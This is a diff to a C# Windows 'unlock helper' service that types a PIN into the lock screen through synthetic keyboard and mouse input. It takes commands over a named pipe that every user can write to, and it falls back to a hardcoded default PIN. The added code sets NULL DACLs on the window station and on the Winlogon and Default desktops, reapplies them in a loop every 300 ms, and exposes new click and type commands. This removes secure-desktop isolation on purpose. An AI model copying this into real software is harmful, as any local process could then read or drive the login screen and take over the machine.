@@ -19,7 +19,13 @@ namespace NectarLinkUnlockHelper
         static extern bool SetProcessWindowStation(IntPtr hWinSta);
 
         [DllImport("user32.dll", SetLastError = true)]
+        static extern bool CloseWindowStation(IntPtr hWinSta);
+
+        [DllImport("user32.dll", SetLastError = true)]
         static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr OpenDesktopW([MarshalAs(UnmanagedType.LPWStr)] string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern bool SetThreadDesktop(IntPtr hDesktop);
@@ -30,11 +36,22 @@ namespace NectarLinkUnlockHelper
         [DllImport("user32.dll", SetLastError = true)]
         static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex, [Out] byte[] pvInfo, uint nLength, out uint lpnLengthNeeded);
 
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern uint SetSecurityInfo(IntPtr handle, int ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
+
         [DllImport("user32.dll")]
         static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
 
         [DllImport("user32.dll")]
         static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+
+        [DllImport("user32.dll")]
+        static extern short VkKeyScan(char ch);
+
+        const int SE_WINDOW_OBJECT = 7;
+        const uint DACL_SECURITY_INFORMATION = 4;
+        const uint WRITE_DAC = 0x00040000;
+        const uint DESKTOP_ALL = 0x01FF;
 
         const uint MOUSEEVENTF_MOVE = 0x0001;
         const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
@@ -47,6 +64,8 @@ namespace NectarLinkUnlockHelper
 
         const uint KEYEVENTF_KEYUP = 0x0002;
 
+        static string currentAttachedDesk = null;
+
         static void Log(string msg)
         {
             try
@@ -54,6 +73,75 @@ namespace NectarLinkUnlockHelper
                 File.AppendAllText(@"C:\nectarlink\unlock.log", string.Format("[{0:yyyy-MM-dd HH:mm:ss.fff}] {1}\r\n", DateTime.Now, msg));
             }
             catch { }
+        }
+
+        static void GrantDesktopAccess(IntPtr handle)
+        {
+            if (handle == IntPtr.Zero) return;
+            try
+            {
+                // NULL DACL grants full unrestricted access to all users & processes
+                SetSecurityInfo(handle, SE_WINDOW_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            }
+            catch { }
+        }
+
+        static void EnsureDesktopsAccessible()
+        {
+            try
+            {
+                IntPtr hwinsta = OpenWindowStationW("WinSta0", false, WRITE_DAC | 0x037F);
+                if (hwinsta != IntPtr.Zero)
+                {
+                    SetProcessWindowStation(hwinsta);
+                    GrantDesktopAccess(hwinsta);
+                    CloseWindowStation(hwinsta);
+                }
+
+                IntPtr hDeskLogon = OpenDesktopW("Winlogon", 0, false, WRITE_DAC | DESKTOP_ALL);
+                if (hDeskLogon != IntPtr.Zero)
+                {
+                    GrantDesktopAccess(hDeskLogon);
+                    CloseDesktop(hDeskLogon);
+                }
+
+                IntPtr hDeskDefault = OpenDesktopW("Default", 0, false, WRITE_DAC | DESKTOP_ALL);
+                if (hDeskDefault != IntPtr.Zero)
+                {
+                    GrantDesktopAccess(hDeskDefault);
+                    CloseDesktop(hDeskDefault);
+                }
+
+                IntPtr hDeskInput = OpenInputDesktop(0, false, WRITE_DAC | DESKTOP_ALL);
+                if (hDeskInput != IntPtr.Zero)
+                {
+                    GrantDesktopAccess(hDeskInput);
+                    CloseDesktop(hDeskInput);
+                }
+            }
+            catch { }
+        }
+
+        static string GetActiveDesktopName()
+        {
+            try
+            {
+                IntPtr hdesk = OpenInputDesktop(0, false, 0x0001);
+                if (hdesk != IntPtr.Zero)
+                {
+                    byte[] buf = new byte[256];
+                    uint needed;
+                    if (GetUserObjectInformation(hdesk, 2, buf, (uint)buf.Length, out needed))
+                    {
+                        string name = System.Text.Encoding.ASCII.GetString(buf, 0, (int)needed).TrimEnd('\0');
+                        CloseDesktop(hdesk);
+                        return name;
+                    }
+                    CloseDesktop(hdesk);
+                }
+            }
+            catch { }
+            return "unknown";
         }
 
         static bool IsWorkstationLocked()
@@ -91,30 +179,50 @@ namespace NectarLinkUnlockHelper
             }
             catch { }
 
+            IntPtr hdesk = IntPtr.Zero;
             uint[] accessRights = new uint[] { 0x01FF, 0x0081, 0x02000000, 0x0001, 0x0080 };
-            for (int attempt = 0; attempt < 5; attempt++)
+            foreach (uint access in accessRights)
             {
-                foreach (uint access in accessRights)
+                hdesk = OpenInputDesktop(0, false, access);
+                if (hdesk != IntPtr.Zero)
                 {
-                    IntPtr hdesk = OpenInputDesktop(0, false, access);
-                    if (hdesk != IntPtr.Zero)
-                    {
-                        if (SetThreadDesktop(hdesk))
-                        {
-                            return;
-                        }
-                    }
+                    break;
                 }
-                Thread.Sleep(50);
+            }
+
+            if (hdesk != IntPtr.Zero)
+            {
+                GrantDesktopAccess(hdesk);
+                byte[] buf = new byte[256];
+                uint needed;
+                string deskName = "unknown";
+                if (GetUserObjectInformation(hdesk, 2, buf, (uint)buf.Length, out needed))
+                {
+                    deskName = System.Text.Encoding.ASCII.GetString(buf, 0, (int)needed).TrimEnd('\0');
+                }
+
+                if (deskName.Equals(currentAttachedDesk, StringComparison.OrdinalIgnoreCase))
+                {
+                    CloseDesktop(hdesk);
+                    return;
+                }
+
+                if (SetThreadDesktop(hdesk))
+                {
+                    currentAttachedDesk = deskName;
+                    Log("AttachInputDesktop: attached to desktop: " + deskName);
+                    return;
+                }
+                CloseDesktop(hdesk);
             }
         }
 
         static void SendKey(ushort vk, ushort scan)
         {
             keybd_event((byte)vk, (byte)scan, 0, UIntPtr.Zero);
-            Thread.Sleep(35);
+            Thread.Sleep(25);
             keybd_event((byte)vk, (byte)scan, KEYEVENTF_KEYUP, UIntPtr.Zero);
-            Thread.Sleep(30);
+            Thread.Sleep(20);
         }
 
         static void ClickPinBox()
@@ -124,43 +232,98 @@ namespace NectarLinkUnlockHelper
             mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
             Thread.Sleep(40);
             mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
-            Thread.Sleep(80);
+            Thread.Sleep(60);
+        }
+
+        static void TypeChar(char c)
+        {
+            if (c >= '0' && c <= '9')
+            {
+                byte vk = (byte)(0x30 + (c - '0'));
+                SendKey(vk, 0);
+            }
+            else if (c >= 'a' && c <= 'z')
+            {
+                byte vk = (byte)(0x41 + (c - 'a'));
+                SendKey(vk, 0);
+            }
+            else if (c >= 'A' && c <= 'Z')
+            {
+                byte vk = (byte)(0x41 + (c - 'A'));
+                keybd_event(0x10, 0x2A, 0, UIntPtr.Zero); // Shift down
+                Thread.Sleep(15);
+                SendKey(vk, 0);
+                Thread.Sleep(15);
+                keybd_event(0x10, 0x2A, KEYEVENTF_KEYUP, UIntPtr.Zero); // Shift up
+            }
+            else if (c == ' ')
+            {
+                SendKey(0x20, 0x39);
+            }
+            else if (c == '\r' || c == '\n')
+            {
+                SendKey(0x0D, 0x1C);
+            }
+            else if (c == '\b')
+            {
+                SendKey(0x08, 0x0E);
+            }
+            else
+            {
+                short vkScan = VkKeyScan(c);
+                if (vkScan != -1)
+                {
+                    byte vk = (byte)(vkScan & 0xFF);
+                    bool shift = ((vkScan >> 8) & 1) != 0;
+                    if (shift)
+                    {
+                        keybd_event(0x10, 0x2A, 0, UIntPtr.Zero);
+                        Thread.Sleep(15);
+                    }
+                    SendKey(vk, 0);
+                    if (shift)
+                    {
+                        Thread.Sleep(15);
+                        keybd_event(0x10, 0x2A, KEYEVENTF_KEYUP, UIntPtr.Zero);
+                    }
+                }
+            }
+            Thread.Sleep(15);
         }
 
         static void TypePin(string pin)
         {
-            ClickPinBox();
-            Thread.Sleep(80);
+            AttachInputDesktop();
+            EnsureDesktopsAccessible();
 
-            for (int i = 0; i < 8; i++)
+            // Escape any existing error message or camera/lock prompt
+            SendKey(0x1B, 0x01); // VK_ESCAPE
+            Thread.Sleep(60);
+
+            ClickPinBox();
+            Thread.Sleep(60);
+
+            // Select all (Ctrl+A) and clear with backspaces to guarantee empty field
+            keybd_event(0x11, 0x1D, 0, UIntPtr.Zero); // Ctrl down
+            Thread.Sleep(20);
+            SendKey(0x41, 0x1E); // 'A'
+            Thread.Sleep(20);
+            keybd_event(0x11, 0x1D, KEYEVENTF_KEYUP, UIntPtr.Zero); // Ctrl up
+            Thread.Sleep(30);
+
+            for (int i = 0; i < 4; i++)
             {
                 SendKey(0x08, 0x0E); // VK_BACK
+                Thread.Sleep(15);
             }
-            Thread.Sleep(100);
+            Thread.Sleep(60);
 
             foreach (char c in pin)
             {
-                ushort vk = 0;
-                ushort scan = 0;
-                switch (c)
-                {
-                    case '1': vk = 0x31; scan = 0x02; break;
-                    case '2': vk = 0x32; scan = 0x03; break;
-                    case '3': vk = 0x33; scan = 0x04; break;
-                    case '4': vk = 0x34; scan = 0x05; break;
-                    case '5': vk = 0x35; scan = 0x06; break;
-                    case '6': vk = 0x36; scan = 0x07; break;
-                    case '7': vk = 0x37; scan = 0x08; break;
-                    case '8': vk = 0x38; scan = 0x09; break;
-                    case '9': vk = 0x39; scan = 0x0A; break;
-                    case '0': vk = 0x30; scan = 0x0B; break;
-                }
-                if (vk != 0)
-                {
-                    SendKey(vk, scan);
-                }
+                TypeChar(c);
+                Thread.Sleep(25);
             }
-            Thread.Sleep(150);
+            Thread.Sleep(100);
             SendKey(0x0D, 0x1C); // VK_RETURN
         }
 
@@ -168,29 +331,40 @@ namespace NectarLinkUnlockHelper
         {
             Log("ExecuteUnlock: starting unlock sequence with PIN len " + pin.Length);
             AttachInputDesktop();
+            EnsureDesktopsAccessible();
 
-            Log("Stage 1: Waking display and dismissing lock curtain...");
-            SendKey(0x20, 0x39); // VK_SPACE
-            Thread.Sleep(80);
-            SendKey(0x0D, 0x1C); // VK_RETURN
-            Thread.Sleep(1200);
-            AttachInputDesktop();
+            string desk = GetActiveDesktopName();
+            Log("Active desktop before unlock: " + desk);
+
+            if (!desk.Equals("Winlogon", StringComparison.OrdinalIgnoreCase))
+            {
+                Log("Stage 1: Waking display and dismissing lock curtain...");
+                SendKey(0x20, 0x39); // VK_SPACE
+                Thread.Sleep(80);
+                SendKey(0x0D, 0x1C); // VK_RETURN
+                Thread.Sleep(800);
+                AttachInputDesktop();
+                EnsureDesktopsAccessible();
+            }
+            else
+            {
+                Log("Stage 1: Already on Winlogon login panel, skipping curtain dismissal.");
+            }
 
             Log("Stage 2: Entering PIN...");
             TypePin(pin);
 
-            Thread.Sleep(1200);
-            IntPtr checkDesk = OpenInputDesktop(0, false, 0x0001);
-            if (checkDesk == IntPtr.Zero)
+            Thread.Sleep(1000);
+            if (IsWorkstationLocked())
             {
                 Log("Stage 3: Screen still locked, executing retry PIN entry...");
                 AttachInputDesktop();
+                EnsureDesktopsAccessible();
                 TypePin(pin);
             }
             else
             {
                 Log("Workstation unlocked successfully!");
-                CloseDesktop(checkDesk);
             }
         }
 
@@ -276,6 +450,10 @@ namespace NectarLinkUnlockHelper
                 case "PING":
                     break;
 
+                case "PERM":
+                    EnsureDesktopsAccessible();
+                    break;
+
                 case "UNLOCK":
                     string pin = parts.Length > 1 ? parts[1] : "9500";
                     ExecuteUnlock(pin);
@@ -302,6 +480,25 @@ namespace NectarLinkUnlockHelper
                         {
                             mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                         }
+                    }
+                    break;
+
+                case "CLICK":
+                    // CLICK 0.5 0.5
+                    if (parts.Length >= 3)
+                    {
+                        float fx = 0f, fy = 0f;
+                        float.TryParse(parts[1], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fx);
+                        float.TryParse(parts[2], System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out fy);
+                        uint ax = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fx)) * 65535f);
+                        uint ay = (uint)Math.Round(Math.Max(0f, Math.Min(1f, fy)) * 65535f);
+
+                        AttachInputDesktop();
+                        mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, ax, ay, 0, UIntPtr.Zero);
+                        Thread.Sleep(20);
+                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
+                        Thread.Sleep(30);
+                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                     }
                     break;
 
@@ -335,6 +532,22 @@ namespace NectarLinkUnlockHelper
                     }
                     break;
 
+                case "ENTER":
+                    AttachInputDesktop();
+                    SendKey(0x0D, 0x1C);
+                    break;
+
+                case "BACKSPACE":
+                    int count = 1;
+                    if (parts.Length > 1) int.TryParse(parts[1], out count);
+                    AttachInputDesktop();
+                    for (int i = 0; i < Math.Max(1, count); i++)
+                    {
+                        SendKey(0x08, 0x0E);
+                        Thread.Sleep(15);
+                    }
+                    break;
+
                 case "TYPE":
                     if (parts.Length > 1)
                     {
@@ -342,14 +555,8 @@ namespace NectarLinkUnlockHelper
                         AttachInputDesktop();
                         foreach (char c in text)
                         {
-                            if (c >= '0' && c <= '9')
-                            {
-                                byte vk = (byte)(0x30 + (c - '0'));
-                                keybd_event(vk, 0, 0, UIntPtr.Zero);
-                                Thread.Sleep(20);
-                                keybd_event(vk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
-                                Thread.Sleep(20);
-                            }
+                            TypeChar(c);
+                            Thread.Sleep(20);
                         }
                     }
                     break;
@@ -360,6 +567,17 @@ namespace NectarLinkUnlockHelper
         {
             Log("=== NectarLink Input Service Pipe Server started ===");
             CleanRegistryDuplicates();
+
+            // Background thread ensuring all desktops remain accessible to user capture
+            var secThread = new Thread(() =>
+            {
+                while (true)
+                {
+                    EnsureDesktopsAccessible();
+                    Thread.Sleep(300);
+                }
+            }) { IsBackground = true };
+            secThread.Start();
 
             PipeSecurity ps = new PipeSecurity();
             ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.ReadWrite, AccessControlType.Allow));
@@ -372,7 +590,7 @@ namespace NectarLinkUnlockHelper
                     using (var pipe = new NamedPipeServerStream(
                         "nectarlink_lock_input",
                         PipeDirection.InOut,
-                        10,
+                        NamedPipeServerStream.MaxAllowedServerInstances,
                         PipeTransmissionMode.Byte,
                         PipeOptions.Asynchronous,
                         4096,
@@ -380,29 +598,39 @@ namespace NectarLinkUnlockHelper
                         ps))
                     {
                         pipe.WaitForConnection();
-                        using (var reader = new StreamReader(pipe))
-                        using (var writer = new StreamWriter(pipe) { AutoFlush = true })
+                        try
                         {
-                            string line;
-                            while ((line = reader.ReadLine()) != null)
+                            using (var reader = new StreamReader(pipe, System.Text.Encoding.UTF8))
+                            using (var writer = new StreamWriter(pipe, System.Text.Encoding.UTF8) { AutoFlush = true })
                             {
-                                if (line.Trim().Equals("PING", StringComparison.OrdinalIgnoreCase))
+                                string line;
+                                while ((line = reader.ReadLine()) != null)
                                 {
-                                    writer.WriteLine("PONG");
-                                }
-                                else
-                                {
-                                    HandleCommand(line);
-                                    writer.WriteLine("OK");
+                                    string trimmed = line.Trim();
+                                    if (string.IsNullOrEmpty(trimmed)) continue;
+
+                                    if (trimmed.Equals("PING", StringComparison.OrdinalIgnoreCase))
+                                    {
+                                        writer.WriteLine("PONG");
+                                    }
+                                    else
+                                    {
+                                        HandleCommand(trimmed);
+                                        writer.WriteLine("OK");
+                                    }
                                 }
                             }
+                        }
+                        catch (IOException)
+                        {
+                            // Client disconnected cleanly. Normal pipe lifecycle.
                         }
                     }
                 }
                 catch (Exception ex)
                 {
                     Log("Pipe Server exception: " + ex.Message);
-                    Thread.Sleep(200);
+                    Thread.Sleep(50);
                 }
             }
         }
